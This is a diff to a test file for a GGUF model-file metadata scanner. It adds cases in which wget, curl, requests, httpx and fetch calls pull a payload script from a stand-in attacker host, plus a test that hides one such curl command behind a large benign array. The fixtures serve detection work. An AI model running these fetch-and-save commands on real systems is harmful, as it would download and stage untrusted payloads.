@@ -1150,6 +1150,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "/usr/bin/wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -fsSLo /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --url https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --connect-timeout 5 https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -X POST https://evil.example/payload.sh", "remote_fetch"),
@@ -1164,6 +1165,8 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
         ("callback", 'url = "https://evil.example/payload"; requests.get(url)', "remote_fetch"),
+        ("callback", "httpx.get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", 'httpx.request("GET", url="https://evil.example/payload")', "remote_fetch"),
         ("callback", "window.fetch('https://evil.example/payload')", "remote_fetch"),
     ],
 )
@@ -1307,6 +1310,23 @@ def test_gguf_metadata_value_checks_are_capped_for_repeated_nested_arrays(tmp_pa
     checks = _failed_metadata_value_checks(result)
     assert len(checks) == 64
     assert result.metadata["metadata_value_security_checks_truncated"] is True
+
+
+def test_gguf_metadata_array_strings_after_large_benign_prefix_are_scanned(tmp_path: Path) -> None:
+    payload = b"".join(_encode_gguf_string(f"benign-token-{index}") for index in range(1100))
+    payload += _encode_gguf_string("curl https://evil.example/payload.sh")
+    path = tmp_path / "late-malicious-array-value.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [("download.array", 9, _encode_gguf_array(8, payload, 1101))],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 1
+    assert checks[0].details["value_path"] == "[1100]"
+    assert checks[0].details["evidence_type"] == "remote_fetch"
 
 
 def test_gguf_nested_metadata_array_strings_are_scanned_without_flagging_benign_urls(tmp_path: Path) -> None:
